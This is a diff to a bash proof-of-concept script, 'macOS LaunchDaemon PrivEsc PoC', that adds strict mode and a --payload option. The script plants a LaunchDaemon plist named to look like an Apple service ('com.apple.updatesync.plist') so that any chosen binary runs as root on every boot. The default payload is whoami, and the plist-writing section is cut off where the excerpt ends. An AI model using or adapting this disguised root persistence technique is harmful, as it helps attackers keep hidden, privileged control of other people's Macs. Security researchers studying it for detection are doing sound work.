@@ -1,17 +1,26 @@
 #!/bin/bash
 # -----------------------------------------------------------------------------
 # macOS LaunchDaemon PrivEsc PoC – Requires root
-# Creates a LaunchDaemon that executes a root-level payload on system boot
+# Creates a LaunchDaemon that executes a root-level payload on system boot.
 # Permit execution: chmod +x poc.sh
-# Execute via: sudo ./poc.sh
-
+# Execute via: sudo ./poc.sh [--payload /path/to/binary]
+#
 # Author: SentinelByte
-# Version: 1.01
+# Version: 1.02
 # -----------------------------------------------------------------------------
+
+set -euo pipefail
 
 PLIST_NAME="com.apple.updatesync.plist"
 PLIST_PATH="/Library/LaunchDaemons/$PLIST_NAME"
-PAYLOAD="/usr/bin/whoami"  # Change this to any root-level payload you want
+PAYLOAD="/usr/bin/whoami"  # default; override with --payload
+
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        --payload) PAYLOAD="$2"; shift 2 ;;
+        *) echo "Usage: sudo $0 [--payload /path/to/binary]" >&2; exit 1 ;;
+    esac
+done
 
 # -----------------------------------------------------------------------------
 # Write the LaunchDaemon plist
